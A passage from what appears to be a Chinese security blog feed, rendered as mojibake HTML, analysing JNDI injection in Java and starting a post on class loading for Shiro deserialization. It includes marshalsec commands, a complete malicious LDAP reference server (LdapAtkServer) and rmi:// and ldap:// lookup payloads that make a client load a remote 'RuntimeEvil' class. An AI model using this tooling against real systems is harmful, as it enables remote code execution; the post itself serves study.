class="line">&#125;</span><br></pre></td></tr></table></figure><p>JNDIClientæ‰§è¡Œlookupå°±èƒ½å¼¹è®¡ç®—å™¨</p><blockquote><p>æ–°RuntimeEvil.classä¸ºä»€ä¹ˆReferenceç‰ˆçš„æ‰§è¡Œå‘½ä»¤æ˜¯å†™åœ¨æ„é€ å‡½æ•°ï¼Œè€ŒRMIç‰ˆå‘½ä»¤æ‰§è¡Œä»£ç æ˜¯å†™åœ¨å®ç°æ–¹æ³•sayHelloé‡Œé¢å‘¢ï¼Ÿ</p></blockquote><p>æ¥çœ‹ä»£ç ï¼š</p><h3 id="æºç åˆ†æ-1"><a href="#æºç åˆ†æ-1" class="headerlink" title="æºç åˆ†æ"></a>æºç åˆ†æ</h3><p>åœ¨JNDIReferenceServerçš„rebindæ–¹æ³•æ‰“ä¸Šæ–­ç‚¹ï¼š</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240925163542911.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240925163542911.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>è·Ÿè¿›å»å‘ç°ï¼Œåœ¨RegistryContext.rebindå†…ï¼Œè°ƒç”¨RegistryImpl_Stub.rebindè¿›è¡Œç»‘å®šçš„å¯¹è±¡ï¼Œæ˜¯ç”¨encodeObjectå°è£…è¿‡çš„</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240925163649452.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240925163649452.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>è·Ÿè¿›encodeObjectï¼Œçœ‹åˆ°ï¼Œå¦‚æœç»‘å®šçš„ç±»æ˜¯Referenceç±»å‹ï¼Œåˆ™ä¼šç”¨RefrenceWrapperå°è£…</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240925163852311.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240925163852311.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>OKï¼Œæ¢å¤ç¨‹åºï¼Œå†åˆ°å®¢æˆ·ç«¯lookupæ‰“ä¸Šæ–­ç‚¹</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240925164116719.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240925164116719.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>è·Ÿåˆ°RegistryContext.lookupå†…ï¼Œè°ƒç”¨RegistryImpl_Stub.lookupåï¼Œè°ƒç”¨decodeObjectè§£å°è£…</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240925164243051.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240925164243051.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>å¦‚æœéœ€è¦æŸ¥è¯¢çš„å¯¹è±¡æ˜¯RemoteReferenceç±»å‹ï¼Œåˆ™ç”¨è°ƒç”¨getRefrence()è·å–ï¼Œç´§è·Ÿç€è°ƒç”¨NameManger.getObjectInstance</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240925164450260.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240925164450260.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>æ‰§è¡Œå®ŒgetReferenceåï¼Œå·²ç»å˜æˆäº†æˆ‘ä»¬Serveræ–°å»ºçš„Referenceå¯¹è±¡ã€‚é‚£NameManger.getObjectInstanceä¸€å®šæ˜¯è§£æReferenceäº†</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240925164725973.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240925164725973.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>æ²¡é”™ï¼ŒNameManger.getObjectInstanceå†…è°ƒç”¨äº†getObjectFactoryFromRefrenceå’Œfactory.getObjectInstance</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240925164948551.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240925164948551.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>getObjectFactoryFromReferenceå†…ï¼Œå…ˆè°ƒäº†ä¸ªhelper.loadClass</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240925165215328.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240925165215328.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>è·Ÿè¿›å»å‘ç°å°±æ˜¯ç”¨AppClassLoaderæ¥åŠ è½½ç±»ï¼Œä¹Ÿå°±æ˜¯åœ¨æœ¬åœ°Pathæ‰¾æ‰¾æœ‰æ²¡æœ‰è¿™ä¸ªè¿œç¨‹ç±»</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240925165338524.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240925165338524.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>loadClassåï¼Œç´§æ¥ç€å°±æ˜¯ä»codebaseåŠ è½½ç±»ï¼Œè¿™é‡Œcodebaseå°±æ˜¯æˆ‘ä»¬æä¾›çš„httpè·¯å¾„</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240925165536631.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240925165536631.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>æœ€ånewInstanceåˆ›å»ºå®ä¾‹å¹¶è¿”å›</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240925165553736.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240925165553736.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>Soï¼ŒRMIåªæ˜¯è¿”å›äº†åˆ›å»ºå¥½çš„å®ä¾‹ã€‚å¦‚æœJNDIç»‘å®šçš„æ˜¯Referenceï¼Œåˆ™ä¼šä¼ é€’RefrenceWrapperå°è£…çš„ç±»ï¼Œåœ¨å®¢æˆ·ç«¯ä¸Šè§£å°è£…å¹¶ä»factoryLocationåŠ è½½ç±»å¹¶å®ä¾‹åŒ–ã€‚</p><p>å¦‚æœä¸æ˜¯Referenceï¼Œå½“ç„¶ä¸ä¼šåœ¨å®¢æˆ·ç«¯å®ä¾‹åŒ–ï¼Œä¹Ÿå°±ä¸ä¼šè°ƒç”¨æ„é€ å‡½æ•°</p><p>ä¸Šè¿°JNDI+RMIå¯ä»¥ç”¨marshalsecæ¥èµ·</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-<span class="number">0.0</span><span class="number">.3</span>-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http:<span class="comment">//127.0.0.1:8888/#RuntimeEvil 1099</span></span><br></pre></td></tr></table></figure><p>é»˜è®¤RMIä¸º1099</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240925174614914.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240925174614914.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>lookup payloadï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rmi:<span class="comment">//127.0.0.1:1099/#RuntimeEvil</span></span><br></pre></td></tr></table></figure><h2 id="JNDI-other"><a href="#JNDI-other" class="headerlink" title="JNDI other"></a>JNDI other</h2><p>JNDIæ”¯æŒå››ç§åè®®ï¼Œå¦‚ä¸‹è¡¨ã€‚</p><table><thead><tr><th>åè®®</th><th>ä½œç”¨</th></tr></thead><tbody><tr><td>LDAP</td><td>è½»é‡çº§ç›®å½•è®¿é—®åè®®ï¼Œçº¦å®šäº† Client ä¸ Server ä¹‹é—´çš„ä¿¡æ¯äº¤äº’æ ¼å¼ã€ä½¿ç”¨çš„ç«¯å£å·ã€è®¤è¯æ–¹å¼ç­‰å†…å®¹</td></tr><tr><td>RMI</td><td>JAVA è¿œç¨‹æ–¹æ³•åè®®ï¼Œè¯¥åè®®ç”¨äºè¿œç¨‹è°ƒç”¨åº”ç”¨ç¨‹åºç¼–ç¨‹æ¥å£ï¼Œä½¿å®¢æˆ·æœºä¸Šè¿è¡Œçš„ç¨‹åºå¯ä»¥è°ƒç”¨è¿œç¨‹æœåŠ¡å™¨ä¸Šçš„å¯¹è±¡</td></tr><tr><td>DNS</td><td>åŸŸåæœåŠ¡</td></tr><tr><td>CORBA</td><td>å…¬å…±å¯¹è±¡è¯·æ±‚ä»£ç†ä½“ç³»ç»“æ„</td></tr></tbody></table><p>å…¶ä¸­LDAP,RMI,CORBAéƒ½æ”¯æŒåŠ è½½è¿œç¨‹å¯¹è±¡å¹¶å®ä¾‹åŒ–</p><p>æ ¹æ®ä¸åŒçš„åè®®ï¼Œè¿™é‡Œè·å–åˆ°çš„Contextä¸åŒ</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240925171820187.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240925171820187.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240925171844532.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240925171844532.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>æ¯”å¦‚RMIæ˜¯è·å–åˆ°RegistryContext.class</p><ul><li>8u121ä¿®å¤</li></ul><p>jdniåœ¨8u121åï¼Œåœ¨åŠ è½½factoryLocationæ—¶ï¼Œå¯¹è¿œç¨‹codebaseä¸å†ä¿¡èµ–ï¼Œé»˜è®¤trustURLCodebaseä¸ºfalseã€‚</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240925180637512.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240925180637512.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp">ä¸è¿‡åªåŠ äº†RMIå’ŒCORBAçš„ï¼ŒLDAPä¾æ—§èƒ½æ‰“ï¼Œè¯¦æƒ…è‡ªå·±å»LDAPctxæ–‡ä»¶è·Ÿ</p><p>å¦‚æœä½ è¦ç”¨ldapæœåŠ¡æ‰“ï¼Œç›¸åº”çš„å°±è¦æ”¹RMIServerä¸ºLDAPServerï¼š</p><p>ç›´æ¥æŠ„ä¸€ä¸ªï¼Œå› ä¸ºLDAPæœåŠ¡ä¸æ˜¯javaç‰¹æœ‰çš„ï¼Œå…¶ä»–è¯­è¨€ä¹Ÿåœ¨ç”¨çš„ä¸€ä¸ªè½»å‹ç›®å½•è®¿é—®åè®®ï¼ˆLightweight Directory Access Protocolï¼‰ï¼Œå›¾æ–¹ä¾¿å¯ä»¥ç”¨marshalsecèµ·</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-<span class="number">0.0</span><span class="number">.3</span>-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http:<span class="comment">//127.0.0.1:8888/#RuntimeEvil 1099</span></span><br></pre></td></tr></table></figure><p>ä¹Ÿå¯ä»¥ç”¨javaèµ·ï¼Œä»£ç æ¯”è¾ƒéº»çƒ¦</p><p>ä¾èµ–ï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.unboundid<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>unboundid-ldapsdk<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.1.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.net.InetAddress;</span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> javax.net.ServerSocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.SocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.ssl.SSLSocketFactory;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServer;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryListenerConfig;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.Entry;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.LDAPException;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.LDAPResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.ResultCode;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LdapAtkServer</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">LDAP_BASE</span> <span class="operator">=</span> <span class="string">&quot;dc=t4rrega,dc=domain&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span> <span class="params">( String[] tmp_args )</span> &#123;</span><br><span class="line">        String[] args=<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;http://127.0.0.1:8888/#RuntimeEvil&quot;</span>&#125;;</span><br><span class="line">        <span class="type">int</span> <span class="variable">port</span> <span class="operator">=</span> <span class="number">1099</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">InMemoryDirectoryServerConfig</span> <span class="variable">config</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InMemoryDirectoryServerConfig</span>(LDAP_BASE);</span><br><span class="line">            config.setListenerConfigs(<span class="keyword">new</span> <span class="title class_">InMemoryListenerConfig</span>(</span><br><span class="line">                    <span class="string">&quot;listen&quot;</span>, <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">                    InetAddress.getByName(<span class="string">&quot;0.0.0.0&quot;</span>), <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">                    port,</span><br><span class="line">                    ServerSocketFactory.getDefault(),</span><br><span class="line">                    SocketFactory.getDefault(),</span><br><span class="line">                    (SSLSocketFactory) SSLSocketFactory.getDefault()));</span><br><span class="line"></span><br><span class="line">            config.addInMemoryOperationInterceptor(<span class="keyword">new</span> <span class="title class_">OperationInterceptor</span>(<span class="keyword">new</span> <span class="title class_">URL</span>(args[ <span class="number">0</span> ])));</span><br><span class="line">            <span class="type">InMemoryDirectoryServer</span> <span class="variable">ds</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InMemoryDirectoryServer</span>(config);</span><br><span class="line">            System.out.println(<span class="string">&quot;Listening on 0.0.0.0:&quot;</span> + port); <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">            ds.startListening();</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> ( Exception e ) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">OperationInterceptor</span> <span class="keyword">extends</span> <span class="title class_">InMemoryOperationInterceptor</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> URL codebase;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">OperationInterceptor</span> <span class="params">( URL cb )</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.codebase = cb;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">processSearchResult</span> <span class="params">( InMemoryInterceptedSearchResult result )</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">base</span> <span class="operator">=</span> result.getRequest().getBaseDN();</span><br><span class="line">            <span class="type">Entry</span> <span class="variable">e</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Entry</span>(base);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                sendResult(result, base, e);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> ( Exception e1 ) &#123;</span><br><span class="line">                e1.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">sendResult</span> <span class="params">( InMemoryInterceptedSearchResult result, String base, Entry e )</span> <span class="keyword">throws</span> LDAPException, MalformedURLException &#123;</span><br><span class="line">            <span class="type">URL</span> <span class="variable">turl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="built_in">this</span>.codebase, <span class="built_in">this</span>.codebase.getRef().replace(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;/&#x27;</span>).concat(<span class="string">&quot;.class&quot;</span>));</span><br><span class="line">            System.out.println(<span class="string">&quot;Send LDAP reference result for &quot;</span> + base + <span class="string">&quot; redirecting to &quot;</span> + turl);</span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaClassName&quot;</span>, <span class="string">&quot;foo&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">cbstring</span> <span class="operator">=</span> <span class="built_in">this</span>.codebase.toString();</span><br><span class="line">            <span class="type">int</span> <span class="variable">refPos</span> <span class="operator">=</span> cbstring.indexOf(<span class="string">&#x27;#&#x27;</span>);</span><br><span class="line">            <span class="keyword">if</span> ( refPos &gt; <span class="number">0</span> ) &#123;</span><br><span class="line">                cbstring = cbstring.substring(<span class="number">0</span>, refPos);</span><br><span class="line">            &#125;</span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaCodeBase&quot;</span>, cbstring);</span><br><span class="line">            e.addAttribute(<span class="string">&quot;objectClass&quot;</span>, <span class="string">&quot;javaNamingReference&quot;</span>); <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaFactory&quot;</span>, <span class="built_in">this</span>.codebase.getRef());</span><br><span class="line">            result.sendSearchEntry(e);</span><br><span class="line">            result.setResult(<span class="keyword">new</span> <span class="title class_">LDAPResult</span>(<span class="number">0</span>, ResultCode.SUCCESS));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è®°å¾—è¦æ”¹åè®®ï¼Œlookup payloadï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ldap:<span class="comment">//127.0.0.1:1099/#JNDI_RuntimeEvil</span></span><br></pre></td></tr></table></figure><ul><li>ä¿®å¤</li></ul><p>8u191 <code>com.sun.jndi.ldap.object.trustURLCodebase </code>å±æ€§çš„é»˜è®¤å€¼è¢«è°ƒæ•´ä¸ºfalseï¼ŒLDAPä¹Ÿæ‰“ä¸äº†äº†</p><p>æ€»ä¹‹æœ‰JNDIï¼Œå»ºè®®ç›´æ¥LDAPæ‰“ï¼Œé™¤éæœåŠ¡å™¨ç¦äº†LDAPåè®®</p>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
          <category> RMI </category>
          
      </categories>
      
      
        <tags>
            
            <tag> javaåŸç”ŸRCE </tag>
            
            <tag> JNDI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>loadClasså’ŒforNameåŠ è½½æ•°ç»„ç±»</title>
      <link href="/2024/09/23/loadclass-he-forname-jia-zai-shu-zu-lei/"/>
      <url>/2024/09/23/loadclass-he-forname-jia-zai-shu-zu-lei/</url>
      
        <content type="html"><![CDATA[<p>åœ¨æ‰“shiroçš„æ—¶å€™ï¼Œæˆ‘ä»¬å‘ç°ä¸èƒ½ç”¨Transformeræ•°ç»„ï¼Œè€Œèƒ½ç”¨byte[]æ•°ç»„ï¼Œè¿™æ˜¯ä¸ºç”šï¼Ÿ</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240922200019055.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240922200019055.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>åŸæ–‡ï¼š</p><p><a href="https://godownio.github.io/2024/08/06/shiro-fan-xu-lie-hua-shen-ji/">https://godownio.github.io/2024/08/06/shiro-fan-xu-lie-hua-shen-ji/</a></p><h2 id="ClassLoader-loadClasså’ŒClass-forName"><a href="#ClassLoader-loadClasså’ŒClass-forName" class="headerlink" title="ClassLoader.loadClasså’ŒClass.forName"></a>ClassLoader.loadClasså’ŒClass.forName</h2><p>å…ˆè¯´ç»“è®ºã€‚<code>URLClassLoader#loadClassä¸èƒ½åŠ è½½æ•°ç»„ç±»ï¼ŒClass#forNameå¯ä»¥åŠ è½½æ•°ç»„ç±»</code></p><h3 id="Class-forName"><a href="#Class-forName" class="headerlink" title="Class.forName"></a>Class.forName</h3><p>Class#forNameè°ƒç”¨äº†ä¸€ä¸ªnativeæ–¹æ³•è¿›è¡ŒåŠ è½½</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240923102910864.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240923102910864.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>è¿™ä¸ªåˆ†æä¸äº†ï¼Œä½†æ˜¯ç»“è®ºå°±æ˜¯forName0å¯ä»¥åŠ è½½æ•°ç»„ç±»ï¼Œä¸”æ ¹æ®ClassLoaderéµå¾ªåŒäº²å§”æ´¾é€»è¾‘</p><h3 id="ClassLoader-loadClass"><a href="#ClassLoader-loadClass" class="headerlink" title="ClassLoader.loadClass"></a>ClassLoader.loadClass</h3><p>ClassLoader#loadClasså®ç°äº†åŒäº²å§”æ´¾ã€‚</p><p>è¿˜è®°å¾—ä¹‹å‰è®²çš„åŒäº²å§”æ´¾æœºåˆ¶å—ï¼ŒloadClasså‘çˆ¶åŠ è½½å™¨ä¼ é€’ï¼Œåˆ°é¡¶å±‚å†é€å±‚è°ƒç”¨findClassæŸ¥æ‰¾ç±»</p><p>ä¸€èˆ¬æ¥è¯´ClassLoaderçš„å…·ä½“å®ç°ç±»éƒ½ä¸ä¼šä¿®æ”¹è¿™ä¸ªloadClassï¼Œè€Œæ˜¯æ”¹findClassæ–¹æ³•ï¼Œæ”¹å†™å…·ä½“çš„æœç´¢ç±»çš„é€»è¾‘ã€‚æ¯”å¦‚æœ€å¸¸ç”¨çš„URLClassLoaderç±»ï¼Œä¹Ÿå°±æ˜¯ExtClassLoaderå’ŒAppClassLoaderçš„çˆ¶ç±»ï¼Œå°±æ²¡æœ‰é‡å†™loadClassï¼Œè€Œæ˜¯é‡å†™äº†findClassï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> Class&lt;?&gt; findClass(<span class="keyword">final</span> String name)</span><br><span class="line">    <span class="keyword">throws</span> ClassNotFoundException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">final</span> Class&lt;?&gt; result;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        result = AccessController.doPrivileged(</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">PrivilegedExceptionAction</span>&lt;Class&lt;?&gt;&gt;() &#123;</span><br><span class="line">                <span class="keyword">public</span> Class&lt;?&gt; run() <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">                    <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> name.replace(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;/&#x27;</span>).concat(<span class="string">&quot;.class&quot;</span>);</span><br><span class="line">                    <span class="type">Resource</span> <span class="variable">res</span> <span class="operator">=</span> ucp.getResource(path, <span class="literal">false</span>);</span><br><span class="line">                    <span class="keyword">if</span> (res != <span class="literal">null</span>) &#123;</span><br><span class="line">                        <span class="keyword">try</span> &#123;</span><br><span class="line">                            <span class="keyword">return</span> defineClass(name, res);</span><br><span class="line">                        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ClassNotFoundException</span>(name, e);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;, acc);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (java.security.PrivilegedActionException pae) &#123;</span><br><span class="line">        <span class="keyword">throw</span> (ClassNotFoundException) pae.getException();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (result == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title 